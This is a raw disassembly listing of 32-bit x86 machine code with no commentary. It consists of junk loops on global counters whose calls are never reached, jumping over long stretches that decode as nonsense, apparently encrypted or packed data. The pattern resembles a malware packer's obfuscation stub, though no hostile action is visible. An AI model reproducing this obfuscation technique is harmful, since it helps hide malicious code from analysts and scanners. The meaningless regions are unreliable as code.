  40ecd5:	jne    0x40ecf1
  40ecdb:	push   DWORD PTR [ebp-0x1c]
  40ecde:	push   0x65c1
  40ece3:	push   DWORD PTR [ebp-0x20]
  40ece6:	push   0x6120
  40eceb:	call   DWORD PTR ds:0x41d254
  40ecf1:	cmp    DWORD PTR ds:0x42a899,0x6
  40ecf8:	jne    0x40ed0b
  40ecfe:	mov    edi,DWORD PTR ds:0x42a899
  40ed04:	dec    edi
  40ed05:	mov    DWORD PTR ds:0x42a899,edi
  40ed0b:	mov    edi,DWORD PTR ds:0x42a899
  40ed11:	dec    edi
  40ed12:	mov    DWORD PTR ds:0x42a899,edi
  40ed18:	jmp    0x40ecc1
  40ed1d:	and    DWORD PTR ds:0x42a8a5,0x0
  40ed27:	mov    edi,DWORD PTR ds:0x42a8a5
  40ed2d:	inc    edi
  40ed2e:	mov    DWORD PTR ds:0x42a8a5,edi
  40ed34:	cmp    DWORD PTR ds:0x42a8a5,0x5
  40ed3b:	jne    0x40ed53
  40ed41:	push   DWORD PTR [ebp-0xc]
  40ed44:	push   DWORD PTR [ebp-0xc]
  40ed47:	push   DWORD PTR [ebp-0x18]
  40ed4a:	push   DWORD PTR [ebp-0x14]
  40ed4d:	call   DWORD PTR ds:0x41d1a4
  40ed53:	cmp    DWORD PTR ds:0x42a8a5,0x4
  40ed5a:	jne    0x40ed6d
  40ed60:	mov    edi,DWORD PTR ds:0x42a8a5
  40ed66:	inc    edi
  40ed67:	mov    DWORD PTR ds:0x42a8a5,edi
  40ed6d:	cmp    DWORD PTR ds:0x42a8a5,0x1f
  40ed74:	jb     0x40ed27
  40ed7a:	add    edi,DWORD PTR ds:0x42a81d
  40ed80:	add    edx,ecx
  40ed82:	mov    edi,DWORD PTR ds:0x42a811
  40ed88:	xor    DWORD PTR ds:0x42a895,edi
  40ed8e:	jmp    0x40f016
  40ed93:	retf   0xc5c0
  40ed96:	ror    cl,0xc5
  40ed99:	leave  
  40ed9a:	retf   0x1a17
  40ed9d:	push   edx
  40ed9e:	xchg   edx,eax
  40ed9f:	test   eax,0x61bb8933
  40eda4:	mov    edi,0x7ee57878
  40eda9:	js     0x40ee23
  40edab:	(bad)  
  40edad:	(bad)  
  40edae:	sub    ecx,DWORD PTR [esi-0x38a778ce]
  40edb4:	dec    edx
  40edb5:	adc    bl,bh
  40edb7:	dec    esp
  40edb8:	dec    eax
  40edb9:	xor    al,0xf6
  40edbb:	sub    eax,DWORD PTR [ebp-0x570ed979]
  40edc1:	or     edi,esi
  40edc3:	(bad)
  40edc6:	jns    0x40edee
  40edc8:	jl     0x40ed91
  40edca:	xchg   edx,eax
  40edcb:	sub    DWORD PTR [ebx-0x3],ebx
  40edce:	add    BYTE PTR [edi+eiz*4],cl
  40edd1:	sbb    ebx,ebx
  40edd3:	xor    bh,al
  40edd5:	outs   dx,BYTE PTR ds:[esi]
  40edd6:	out    dx,eax
  40edd7:	or     eax,0xa538992a
  40eddc:	mov    esp,0x37d90475
  40ede1:	mov    DWORD PTR [edx],ebx
  40ede3:	ret    
  40ede4:	sbb    DWORD PTR [edx+0x3eefdb56],ebx
  40edea:	int    0x5c
  40edec:	pop    ss
  40eded:	mov    dh,0x9c
  40edef:	xchg   BYTE PTR [edi+0x7d9b8f43],al
  40edf5:	push   0xffffffab
  40edf7:	mov    BYTE PTR [edi+0x2c9cb426],ah
  40edfd:	pop    edi
  40edfe:	lds    esi,FWORD PTR [ebx+0x47680347]
  40ee04:	int3   
  40ee05:	jb     0x40ede3
  40ee07:	sub    edi,0xfc69e550
  40ee0d:	cmp    BYTE PTR [ecx+0x363ed60e],dh
  40ee13:	rcr    DWORD PTR [eax],0x2d
  40ee16:	and    ebx,DWORD PTR [ebx+0x560c9a84]
  40ee1c:	cs (bad) 
  40ee1e:	jne    0x40edc8
  40ee20:	(bad)  
  40ee21:	daa    
  40ee22:	es add al,al
  40ee25:	jecxz  0x40edcd
  40ee27:	js     0x40ee96
  40ee29:	daa    
  40ee2a:	test   al,0xbc
  40ee2c:	aaa    
  40ee2d:	push   esp
  40ee2e:	dec    ecx
  40ee2f:	mov    al,0x5d
  40ee31:	cld    
  40ee32:	sbb    BYTE PTR [ebp+0x2a],ch
  40ee35:	mov    dh,BYTE PTR [edi]
  40ee37:	paddd  mm4,QWORD PTR [ecx]
  40ee3a:	push   esi
  40ee3b:	jmp    0x866abd34
  40ee40:	clc    
  40ee41:	ret    
  40ee42:	int3   
  40ee43:	jno    0x40ee83
  40ee45:	or     eax,0xacfecdd3
  40ee4a:	pop    ss
  40ee4b:	mov    dl,0x57
  40ee4d:	jecxz  0x40ee20
  40ee4f:	retf   0x78f8
  40ee52:	icebp  
  40ee53:	int    0x3d
  40ee55:	popf   
  40ee56:	jnp    0x40ee24
  40ee58:	push   ds
  40ee59:	pop    eax
  40ee5a:	push   ss
  40ee5b:	out    dx,eax
  40ee5c:	mov    esi,0x3a566bda
  40ee61:	enter  0xca2,0x90
  40ee65:	imul   BYTE PTR [eax+0x52]
  40ee68:	sti    
  40ee69:	cwde   
  40ee6a:	add    DWORD PTR [edi+0x2],ecx
  40ee6d:	and    DWORD PTR [eax],ecx
  40ee6f:	sub    al,dh
  40ee71:	mov    bl,0x1e
  40ee73:	fimul  DWORD PTR [ebx]
  40ee75:	dec    eax
  40ee76:	retf   0x7c9f
  40ee79:	(bad)  
  40ee7a:	aad    0x61
  40ee7c:	and    al,0x5b
  40ee7e:	sub    BYTE PTR [edi+0x32bbd2a0],ah
  40ee84:	dec    esi
  40ee85:	sub    ebx,0x5
  40ee88:	xor    DWORD PTR [ecx],eax
  40ee8a:	mov    ebp,0x373d6e28
  40ee8f:	mov    dl,BYTE PTR [eax]
  40ee91:	out    0xbd,eax
  40ee93:	sub    DWORD PTR [esi+0x35c80066],ebx
  40ee99:	loop   0x40eec6
  40ee9b:	test   ebx,0x7c2153ce
  40eea1:	jmp    0x94d621bf
  40eea6:	in     eax,0x9b
  40eea8:	lods   eax,DWORD PTR ds:[esi]
  40eea9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eeaa:	aaa    
  40eeab:	loope  0x40ee6f
  40eead:	inc    eax
  40eeae:	daa    
  40eeaf:	inc    ecx
  40eeb0:	aad    0xde
  40eeb2:	add    BYTE PTR [ebx-0x46414e2f],cl
  40eeb8:	fmulp  st(0),st
  40eeba:	mov    ebx,0x6192d355
  40eebf:	xchg   edi,eax
  40eec0:	mov    cl,0xd1
  40eec2:	icebp  
  40eec3:	and    dh,BYTE PTR [edi+eax*4+0x72a5412e]
  40eeca:	fimul  DWORD PTR fs:[ebx]
  40eecd:	mov    ch,BYTE PTR [ecx+0x22]
  40eed0:	xchg   ebx,eax
  40eed1:	push   esi
  40eed2:	sti    
  40eed3:	jl     0x40eee5
  40eed5:	pop    eax
  40eed6:	ficomp DWORD PTR [esi+edx*8]
  40eed9:	aad    0x54
  40eedb:	mov    edi,0xcda78795
  40eee0:	outs   dx,BYTE PTR ds:[esi]
  40eee1:	iret   
  40eee2:	sub    esp,DWORD PTR [ebx+0x2a]
  40eee5:	test   BYTE PTR [ebp+0x23],bl
  40eee8:	pop    ss
  40eee9:	outs   dx,DWORD PTR ds:[esi]
  40eeea:	mov    dl,0x82
  40eeec:	add    ebx,DWORD PTR [edx+0x52d5511]
  40eef2:	mov    dh,0xb4
  40eef4:	in     eax,dx
  40eef5:	cmp    esi,edx
  40eef7:	xor    DWORD PTR [edi-0x3a],esp
  40eefa:	or     ebp,DWORD PTR [edx-0x2a]
  40eefd:	pop    esp
  40eefe:	xor    BYTE PTR [ecx-0x4c],cl
  40ef01:	xchg   esp,eax
  40ef02:	add    al,0x10
  40ef04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef05:	aas    
  40ef06:	mov    al,ds:0xb1b8c5d8
  40ef0b:	dec    esp
  40ef0c:	lods   eax,DWORD PTR ds:[esi]
  40ef0d:	cmp    esp,DWORD PTR [ebx]
  40ef0f:	gs mov ch,0x9b
  40ef12:	cmp    ecx,DWORD PTR [ebx]
  40ef14:	in     al,dx
  40ef15:	mov    al,0x92
  40ef17:	pushf  
  40ef18:	or     edx,DWORD PTR [edx+0x59fdc743]
  40ef1e:	aaa    
  40ef1f:	jb     0x40eeb8
  40ef21:	int3   
  40ef22:	dec    esp
  40ef23:	inc    ebp
  40ef24:	fisubr DWORD PTR [edx-0xf]
  40ef27:	xchg   edx,eax
  40ef28:	jmp    0x3b1:0xa8ce66c4
  40ef2f:	fcmovbe st,st(7)
  40ef31:	add    cl,BYTE PTR [ecx]
  40ef33:	inc    edi
  40ef34:	sbb    ah,BYTE PTR [ebx]
  40ef36:	(bad)  
  40ef37:	(bad)  
  40ef38:	jnp    0x40efa6
  40ef3a:	hlt    
  40ef3b:	imul   edx,DWORD PTR [ebp-0x4b],0x278e3af1
  40ef42:	es xor bl,bl
  40ef45:	sbb    ah,al
  40ef47:	cmp    edx,DWORD PTR [ecx-0x72744ec1]
  40ef4d:	mov    edi,0xe0722a4e
  40ef52:	xor    eax,0xa3ffb942
  40ef57:	xor    BYTE PTR [ebp-0x34ddb60d],cl
  40ef5d:	mov    cl,0xf9
  40ef5f:	bound  ecx,QWORD PTR [ebx*1-0x2cb83b53]
  40ef66:	jns    0x40ef72
  40ef68:	add    ah,cl
  40ef6a:	pop    edx
  40ef6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef6c:	pop    edi
  40ef6d:	jg     0x40efb2
  40ef6f:	fistp  WORD PTR [ebp+0x32728340]
  40ef75:	push   es
  40ef76:	fucomp st(4)
  40ef78:	push   cs
  40ef79:	pop    ebx
  40ef7a:	fiadd  WORD PTR [esi]
  40ef7c:	or     edx,eax
  40ef7e:	or     dh,BYTE PTR fs:[esi+0x30]
  40ef82:	mov    ds:0x3f843f26,al
  40ef87:	xor    al,0x95
  40ef89:	jae    0x40ef25
  40ef8b:	cmp    dl,dh
  40ef8d:	and    cl,BYTE PTR [ebp+ebp*8-0x25]
  40ef91:	stc    
  40ef92:	ss inc ebx
  40ef94:	fldenv [ecx]
  40ef96:	out    0xd4,al
  40ef98:	stc    
  40ef99:	sub    bh,bl
  40ef9b:	retf   
  40ef9c:	bnd ret 
  40ef9e:	pop    ss
  40ef9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40efa0:	adc    al,0x5f
  40efa2:	sbb    DWORD PTR ds:0x40e628b4,ebx
  40efa8:	add    eax,DWORD PTR [ecx+0x14]
  40efab:	int3   
  40efac:	test   ecx,ecx
  40efae:	mov    edx,DWORD PTR [edx-0x2f85953]
  40efb4:	test   esp,edx
  40efb6:	int3   
  40efb7:	(bad)  
  40efb9:	int3   
  40efba:	fwait
  40efbb:	mov    BYTE PTR [esi],bl
  40efbd:	mov    ebx,0x99bcc69a
  40efc2:	into   
  40efc3:	cmp    ebp,esi
  40efc5:	lea    esi,ds:0x46deb419
  40efcb:	add    ch,al
  40efcd:	mov    ebx,0x4c33b8c1
  40efd2:	and    BYTE PTR [esp+esi*4],bh
  40efd5:	push   ebx
  40efd6:	cmp    BYTE PTR ds:0xa900495d,ch
  40efdc:	stc    
  40efdd:	shr    DWORD PTR [ebp-0x5d],1
  40efe0:	jmp    0x40f023
  40efe2:	inc    ecx
  40efe3:	pusha  
  40efe4:	jb     0x40efa6
  40efe6:	add    eax,DWORD PTR [ebp+ebp*8+0x3666440b]
  40efed:	xchg   esp,eax
  40efee:	lahf   
  40efef:	lock call 0xdd83:0xb84e21f0
  40eff7:	push   esi
  40eff8:	cdq    
  40eff9:	add    bh,BYTE PTR [ebp*4-0x7af70b3d]
  40f000:	jae    0x40ef98
  40f002:	test   al,0x2
  40f004:	or     BYTE PTR [eax+0x2],bh
  40f007:	mov    DWORD PTR es:[ebx+0x4e],ebp
  40f00b:	xchg   edx,eax
  40f00c:	cmp    BYTE PTR gs:[esi],dl
  40f00f:	fstp   DWORD PTR [eax+0x790dccd5]
  40f015:	sub    DWORD PTR [ecx+0x2581f855],ecx
  40f01b:	and    DWORD PTR [eax+0x42],ebp
  40f021:	add    BYTE PTR [eax],al
  40f023:	xor    edi,edi
  40f025:	add    edi,DWORD PTR ds:0x42a821
  40f02b:	inc    edi
  40f02c:	mov    DWORD PTR ds:0x42a821,edi
  40f032:	cmp    DWORD PTR ds:0x42a821,0xa
  40f039:	jne    0x40f04a
  40f03f:	push   0x23fa
  40f044:	call   DWORD PTR ds:0x41d0d0
  40f04a:	cmp    DWORD PTR ds:0x42a821,0x9
  40f051:	jne    0x40f066
  40f057:	xor    edi,edi
  40f059:	or     edi,DWORD PTR ds:0x42a821
  40f05f:	inc    edi
  40f060:	mov    DWORD PTR ds:0x42a821,edi
  40f066:	cmp    DWORD PTR ds:0x42a821,0x10
  40f06d:	jb     0x40f023
  40f073:	and    edi,edi
  40f075:	mov    edx,DWORD PTR [ebp+0x8]
  40f078:	and    DWORD PTR ds:0x42a8ad,0x0
  40f082:	mov    edi,DWORD PTR ds:0x42a8ad
  40f088:	inc    edi
  40f089:	mov    DWORD PTR ds:0x42a8ad,edi
  40f08f:	cmp    DWORD PTR ds:0x42a8ad,0x29
  40f096:	jne    0x40f0ac
  40f09c:	push   0x42a825
  40f0a1:	push   0x4a20
  40f0a6:	call   DWORD PTR ds:0x41d0d4
  40f0ac:	cmp    DWORD PTR ds:0x42a8ad,0x1f
  40f0b3:	jb     0x40f082
  40f0b9:	and    DWORD PTR ds:0x42a779,0x6b84
  40f0c3:	xor    edx,eax
  40f0c5:	jmp    0x40f34d
  40f0ca:	enter  0xcbc4,0xc2
  40f0ce:	fcmovnb st,st(1)
  40f0d0:	aad    0xda
  40f0d2:	push   cs
  40f0d3:	and    al,0x97
  40f0d5:	cmp    al,0x58
  40f0d7:	sar    edx,cl
  40f0d9:	outs   dx,BYTE PTR ds:[esi]
  40f0da:	into   
  40f0db:	mov    esp,0x7ee57878
  40f0e0:	js     0x40f15a
  40f0e2:	mov    esp,DWORD PTR [ebp+eiz*4-0x7f]
  40f0e6:	pop    ebx
  40f0e7:	mov    dh,0xb8
  40f0e9:	pushf  
  40f0ea:	test   edi,0x13effd63
  40f0f0:	cdq    
  40f0f1:	sub    BYTE PTR [esi-0x14f4a6bb],dl
  40f0f7:	cld    
  40f0f8:	fst    QWORD PTR [eax+0x45]
  40f0fb:	out    0xb0,al
  40f0fd:	dec    ebx
  40f0fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f0ff:	xchg   edx,eax
  40f100:	pop    eax
  40f101:	adc    DWORD PTR [ecx],edi
  40f103:	sbb    eax,0xff92fdbb
  40f108:	js     0x40f170
  40f10a:	and    esi,ebx
  40f10c:	and    BYTE PTR [edx+0x56],bl
  40f10f:	jae    0x40f18c
  40f111:	cmp    DWORD PTR [ecx-0x5729c3c5],esi
  40f117:	lahf   
  40f118:	sub    edx,DWORD PTR [eax]
  40f11a:	ins    BYTE PTR es:[edi],dx
  40f11b:	jno    0x40f0ee
  40f11d:	ja     0x40f185
  40f11f:	mov    cl,0xb9
  40f121:	mov    dl,0x4
  40f123:	(bad)  
  40f124:	pop    ebx
  40f125:	sub    ebp,DWORD PTR [edx]
  40f127:	sub    eax,0xe5b30615
  40f12c:	(bad)  
  40f12d:	cmp    ebp,DWORD PTR [ecx+eax*2]
  40f130:	inc    ecx
  40f131:	push   edi
  40f132:	in     al,0x4e
  40f134:	pop    esi
  40f135:	push   es
  40f136:	pusha  
  40f137:	repnz dec ebx
  40f139:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f13a:	(bad)  
  40f13b:	mov    eax,0x14a4a8a0
  40f140:	mov    BYTE PTR [edi],0x76
  40f143:	xor    esi,DWORD PTR [ebp+0x2008d0e9]
  40f149:	sti    
  40f14a:	sbb    eax,0x5bcb1ead
  40f14f:	adc    eax,DWORD PTR [ecx-0x72]
  40f152:	jg     0x40f10d
  40f154:	sahf   
  40f155:	mov    ds:0x64ce0111,al
  40f15a:	xor    BYTE PTR [esi-0x55],bh
  40f15d:	loop   0x40f1d1
  40f15f:	mov    dl,0x26
  40f161:	cld    
  40f162:	fcomip st,st(2)
  40f164:	pop    ebp
  40f165:	xor    dh,BYTE PTR [esi-0x9447bd0]
  40f16b:	cmc    
  40f16c:	mov    ds:0xf4c8e56e,eax
  40f171:	call   0x96b0b17a
  40f176:	loope  0x40f1bf
  40f178:	push   edi
  40f179:	in     al,0xdf
  40f17b:	pusha  
  40f17c:	push   ecx
  40f17d:	sbb    BYTE PTR [eax+eax*1-0x2],0x83
  40f182:	xchg   ecx,eax
  40f183:	shl    esi,1
  40f185:	push   0x45
  40f187:	mov    ds:0x56c6b0f9,eax
  40f18c:	cmp    eax,DWORD PTR [esi+0x5b]
  40f18f:	mov    es,WORD PTR [eax+0x33]
  40f192:	imul   ebx,edx,0xffffffc7
  40f195:	aam    0x1f
  40f197:	jnp    0x40f1bb
  40f199:	lea    edi,[edx+0x73]
  40f19c:	mov    ds:0x5da0630d,eax
  40f1a1:	and    al,0x41
  40f1a3:	xchg   esp,eax
  40f1a4:	lock adc ebp,DWORD PTR [edi+0x4ceeaa5a]
  40f1ab:	outs   dx,BYTE PTR ds:[esi]
  40f1ac:	mov    ebx,0xfc76d609
  40f1b1:	add    DWORD PTR [edi+0x6dab39f1],esp
  40f1b7:	and    al,0xe8
  40f1b9:	fwait
  40f1ba:	int3   
  40f1bb:	cmc    
  40f1bc:	stos   BYTE PTR es:[edi],al
  40f1bd:	dec    edi
  40f1be:	int    0x37
  40f1c0:	add    ebx,esi
  40f1c2:	repnz xor DWORD PTR [edi-0x1],ebx
  40f1c6:	mov    WORD PTR [edx+eiz*4-0x11],fs
  40f1ca:	les    esp,FWORD PTR [edx]
  40f1cc:	ret    0x1158
  40f1cf:	retf   
  40f1d0:	ret    0x69ad
  40f1d3:	and    edx,DWORD PTR [ecx-0xf]
  40f1d6:	and    al,0x2c
  40f1d8:	enter  0x9f08,0xa0
  40f1dc:	ins    BYTE PTR es:[edi],dx
  40f1dd:	push   edi
  40f1de:	vpacksswb xmm5,xmm7,XMMWORD PTR [ebp-0x55d9098d]
  40f1e6:	jnp    0x40f1e1
  40f1e8:	pop    ebp
  40f1e9:	iret   
  40f1ea:	stc    
  40f1eb:	imul   edx,DWORD PTR [ecx+edx*4+0x6f],0xffffffff
  40f1f0:	test   DWORD PTR [eax-0x5d9806bd],ebp
  40f1f6:	pop    esi
  40f1f7:	fcom   QWORD PTR [ecx]
  40f1f9:	add    al,0x52
  40f1fb:	mov    ds:0x64407005,al
  40f200:	ds push eax
  40f202:	push   ss
  40f203:	push   edx
  40f204:	pop    esi
  40f205:	push   ecx
  40f206:	aas    
  40f207:	stc    
  40f208:	or     eax,0xd83dad41
  40f20d:	out    dx,al
  40f20e:	xor    BYTE PTR [ebp+0x7e],al
  40f211:	add    BYTE PTR [ebx-0x11eb0030],cl
  40f217:	mov    eax,0xa32c01d4
  40f21c:	xchg   DWORD PTR [eax+0x7e],ebp
  40f21f:	outs   dx,DWORD PTR ds:[esi]
  40f220:	pop    eax
  40f221:	cmp    eax,DWORD PTR [eax]
  40f223:	into   
  40f224:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f225:	push   esi
  40f226:	push   ecx
  40f227:	loopne 0x40f260
  40f229:	sti    
  40f22a:	call   0x4bd0:0xf83ddb90
  40f231:	mov    esi,0x4fd6f623
  40f236:	ficomp DWORD PTR [ecx]
  40f238:	mov    dl,0x47
  40f23a:	xchg   ecx,eax
  40f23b:	xchg   ebx,eax
  40f23c:	push   ds
  40f23d:	inc    esi
  40f23e:	retf   0x1732
  40f241:	add    eax,DWORD PTR [edi]
  40f243:	jae    0x40f1fe
  40f245:	push   cs
  40f246:	adc    al,0x3c
  40f248:	push   ds
  40f249:	shl    DWORD PTR [ebx+0x62],cl
  40f24c:	das    
  40f24d:	outs   dx,BYTE PTR ds:[esi]
  40f24e:	jle    0x40f2cc
  40f250:	inc    ebp
  40f251:	imul   esi,DWORD PTR [edi+0x78],0x3da9cf88
  40f258:	rcl    BYTE PTR [edx+ecx*8+0x7693ed50],cl
  40f25f:	xor    esp,edx
  40f261:	inc    esp
  40f262:	and    al,dh
  40f264:	test   DWORD PTR [ecx+0x4d],esi
  40f267:	in     al,dx
  40f268:	stos   DWORD PTR es:[edi],eax
  40f269:	inc    esp
  40f26a:	ret    
  40f26b:	repz adc ebp,edi
  40f26e:	jns    0x40f2a7
  40f270:	pop    ebx
  40f271:	mov    WORD PTR [eax],ds
  40f273:	lods   eax,DWORD PTR ds:[esi]
  40f274:	fdiv   QWORD PTR [ebx+0x2c]
  40f277:	call   0xb0c:0x5bc41c03
  40f27e:	jmp    0x1ec8:0x413dca91
  40f285:	nop
  40f286:	gs push 0x6e3ce75d
  40f28c:	sbb    eax,0xfec26a44
  40f291:	push   esp
  40f292:	and    al,0x76
  40f294:	pop    edx
  40f295:	fisttp WORD PTR [ecx]
  40f297:	int3   
  40f298:	inc    ebx
  40f299:	mov    ch,0xef
  40f29b:	stos   DWORD PTR es:[edi],eax
  40f29c:	sbb    eax,0x55148b9
  40f2a1:	ret    
  40f2a2:	outs   dx,BYTE PTR ds:[esi]
  40f2a3:	scas   al,BYTE PTR es:[edi]
  40f2a4:	inc    DWORD PTR [ecx+0x31]
  40f2a7:	dec    ebp
  40f2a8:	add    eax,0x3481f472
  40f2ad:	clc    
  40f2ae:	jl     0x40f296
  40f2b0:	sbb    al,BYTE PTR [edx]
  40f2b2:	pop    ecx
  40f2b3:	mov    ds:0x61ee7b4a,eax
  40f2b8:	out    dx,eax
  40f2b9:	dec    edi
  40f2ba:	mov    al,0xca
  40f2bc:	(bad)  
  40f2bd:	add    cl,0xf9
  40f2c0:	fsub   QWORD PTR [eax+eax*4-0x3a42466d]
  40f2c7:	lahf   
  40f2c8:	pop    esi
  40f2c9:	add    al,0x5b
  40f2cb:	mov    bh,0x73
  40f2cd:	sbb    edx,edi
  40f2cf:	cwde   
  40f2d0:	add    BYTE PTR [edi-0x4],cl
  40f2d3:	xor    BYTE PTR [ebx+0x3c],0xf8
  40f2d7:	mov    ds:0xea246f8c,eax
  40f2dc:	repnz iret 
  40f2de:	test   BYTE PTR [edi],ch
  40f2e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f2e1:	push   ebp
  40f2e2:	mov    dl,0xd3
  40f2e4:	jbe    0x40f269
  40f2e6:	push   eax
  40f2e7:	push   DWORD PTR [esi+0x45307a18]
  40f2ed:	inc    ebx
  40f2ee:	push   ecx
  40f2ef:	xor    BYTE PTR [edx+eiz*8-0x3d4aa4df],cl
  40f2f6:	xor    al,0x62
  40f2f8:	pop    ebp
  40f2f9:	(bad)  
  40f2fb:	mov    ebx,0x27f4d2c
  40f300:	mov    edi,0x24e16196
  40f305:	xor    ebx,DWORD PTR [ebx+0x35d5041a]
  40f30b:	mov    ds:0x58ff3ba6,eax
  40f310:	pop    ss
  40f311:	test   BYTE PTR [ebp-0x2f2f69ef],al
  40f317:	mov    ebp,0x3651e8e5
  40f31c:	leave  
  40f31d:	aas    
  40f31e:	ror    DWORD PTR [ebp-0x5abe519f],1
  40f324:	pop    esi
  40f325:	arpl   WORD PTR [ebx-0x42],si
  40f328:	mov    bh,BYTE PTR [ebp-0x3d131477]
  40f32e:	fiadd  DWORD PTR [edi]
  40f330:	cmc    
  40f331:	push   edi
  40f332:	inc    ebp
  40f333:	pop    ecx
  40f334:	push   0xa54de1f
  40f339:	add    BYTE PTR [ebx],0xbc
  40f33c:	inc    edi
  40f33d:	iret   
  40f33e:	push   0x14762c2f
  40f343:	push   0x94335560
  40f348:	xor    al,0xa0
  40f34a:	dec    edx
  40f34b:	loop   0x40f34b
  40f34d:	add    edx,ecx
  40f34f:	mov    DWORD PTR ds:0x42a82d,0x1d
  40f359:	cmp    DWORD PTR ds:0x42a82d,0x0
  40f360:	je     0x40f3c3
  40f366:	cmp    DWORD PTR ds:0x42a82d,0x7
  40f36d:	jne    0x40f389
  40f373:	push   DWORD PTR [ebp-0x20]
  40f376:	push   DWORD PTR [ebp-0x14]
  40f379:	push   0x7b1d
  40f37e:	push   0x2bb5
  40f383:	call   DWORD PTR ds:0x41d258
  40f389:	cmp    DWORD PTR ds:0x42a82d,0x8
  40f390:	jne    0x40f3a3
  40f396:	mov    edi,DWORD PTR ds:0x42a82d
  40f39c:	dec    edi
  40f39d:	mov    DWORD PTR ds:0x42a82d,edi
  40f3a3:	mov    edi,DWORD PTR ds:0x42a82d
  40f3a9:	dec    edi
  40f3aa:	mov    DWORD PTR ds:0x42a82d,edi
  40f3b0:	jmp    0x40f359
  40f3b5:	xor    edi,edi
  40f3b7:	add    edi,DWORD PTR ds:0x42a779
  40f3bd:	add    DWORD PTR ds:0x42a795,edi
  40f3c3:	mov    DWORD PTR [ebp+0xc],edx
  40f3c6:	xor    edx,DWORD PTR ds:0x42a789
  40f3cc:	mov    DWORD PTR [ebp-0x4],0xf89c85d8
  40f3d3:	or     edx,edx
  40f3d5:	mov    DWORD PTR [ebp-0x28],0xf89c853a
  40f3dc:	and    DWORD PTR ds:0x42a861,0x0
  40f3e6:	jmp    0x40f3f8
  40f3eb:	mov    edx,DWORD PTR ds:0x42a861
  40f3f1:	inc    edx
  40f3f2:	mov    DWORD PTR ds:0x42a861,edx
  40f3f8:	cmp    DWORD PTR ds:0x42a861,0x12
  40f3ff:	jae    0x40f427
  40f405:	cmp    DWORD PTR ds:0x42a861,0x14
  40f40c:	jne    0x40f420
  40f412:	push   0x4578
  40f417:	push   DWORD PTR [ebp-0x14]
  40f41a:	call   DWORD PTR ds:0x41d25c
  40f420:	jmp    0x40f3eb
  40f425:	and    edi,edi
  40f427:	mov    DWORD PTR [ebp-0x2c],0xf89c853b
  40f42e:	sub    edi,DWORD PTR ds:0x42a899
  40f434:	mov    DWORD PTR [ebp-0x30],0xf89c853c
  40f43b:	and    edi,0x6695
  40f441:	mov    DWORD PTR [ebp-0x34],0xf89c853d
  40f448:	or     DWORD PTR ds:0x42a795,0x61f4
  40f452:	mov    DWORD PTR [ebp-0x38],0xf89c853e
  40f459:	and    DWORD PTR ds:0x42a829,0x0
  40f463:	jmp    0x40f477
  40f468:	xor    edx,edx
  40f46a:	xor    edx,DWORD PTR ds:0x42a829
  40f470:	inc    edx
  40f471:	mov    DWORD PTR ds:0x42a829,edx
  40f477:	cmp    DWORD PTR ds:0x42a829,0x11
  40f47e:	jae    0x40f4ac
  40f484:	cmp    DWORD PTR ds:0x42a829,0x1a
  40f48b:	jne    0x40f4a7
  40f491:	push   0x1
  40f493:	push   DWORD PTR [ebp-0xc]
  40f496:	push   DWORD PTR [ebp-0x20]
  40f499:	push   0x1352
  40f49e:	push   DWORD PTR [ebp-0x18]
  40f4a1:	call   DWORD PTR ds:0x41d0d8
  40f4a7:	jmp    0x40f468
  40f4ac:	mov    DWORD PTR [ebp-0x3c],0xf89c853f
  40f4b3:	mov    edx,DWORD PTR [ebp+0x8]
  40f4b6:	xor    edx,eax
  40f4b8:	mov    DWORD PTR ds:0x42a7e9,0x16
  40f4c2:	cmp    DWORD PTR ds:0x42a7e9,0x0
  40f4c9:	je     0x40f553
  40f4cf:	cmp    DWORD PTR ds:0x42a7e9,0x21
  40f4d6:	jne    0x40f4f6
  40f4dc:	push   0x6e96
  40f4e1:	push   0x4a9d
  40f4e6:	push   0x2037
  40f4eb:	push   0x3f81
  40f4f0:	call   DWORD PTR ds:0x41d0dc
  40f4f6:	xor    edi,edi
  40f4f8:	or     edi,DWORD PTR ds:0x42a7e9
  40f4fe:	dec    edi
  40f4ff:	mov    DWORD PTR ds:0x42a7e9,edi
  40f505:	jmp    0x40f4c2
  40f50a:	and    DWORD PTR ds:0x42a861,0x0
  40f514:	jmp    0x40f528
  40f519:	xor    edi,edi
  40f51b:	or     edi,DWORD PTR ds:0x42a861
  40f521:	inc    edi
  40f522:	mov    DWORD PTR ds:0x42a861,edi
  40f528:	cmp    DWORD PTR ds:0x42a861,0x1e
  40f52f:	jae    0x40f553
  40f535:	cmp    DWORD PTR ds:0x42a861,0x26
  40f53c:	jne    0x40f548
  40f542:	call   DWORD PTR ds:0x41d0e0
  40f548:	jmp    0x40f519
  40f54d:	dec    DWORD PTR ds:0x42a7ed
  40f553:	mov    edi,DWORD PTR [ebp-0x10]
  40f556:	mov    DWORD PTR ds:0x42a851,0x29a7
  40f560:	jmp    0x40f7e8
  40f565:	(bad)
  40f568:	ret    0xc2d9
  40f56b:	(bad)  
  40f56d:	sar    DWORD PTR [edi],0x6b
  40f570:	rcl    DWORD PTR [ebx-0x4465ccd8],0x42
  40f577:	js     0x40f5f1
  40f579:	in     eax,0x7e
  40f57b:	js     0x40f5f5
  40f57d:	mov    DWORD PTR [eax+0x4c],ebx
  40f580:	xor    eax,ebp
  40f582:	std    
  40f583:	inc    edi
  40f584:	or     ebp,ebp
  40f586:	into   
  40f587:	pop    ds
  40f588:	push   eax
  40f589:	cdq    
  40f58a:	inc    ebp
  40f58b:	or     eax,0x211d0b43
  40f590:	dec    ebx
  40f591:	sbb    eax,0x872ddd05
  40f596:	mov    dl,0xcf
  40f598:	out    dx,al
  40f599:	jnp    0x40f5c9
  40f59b:	enter  0xd54e,0xf2
  40f59f:	je     0x40f565
  40f5a1:	scas   eax,DWORD PTR es:[edi]
  40f5a2:	push   cs
  40f5a3:	stos   BYTE PTR es:[edi],al
  40f5a4:	sub    BYTE PTR [ecx+edx*2],0x24
  40f5a8:	or     edx,DWORD PTR [esi]
  40f5aa:	sbb    ebp,eax
  40f5ac:	xor    DWORD PTR [eax],0x7b
  40f5af:	dec    eax
  40f5b0:	into   
  40f5b1:	call   0x21947e85
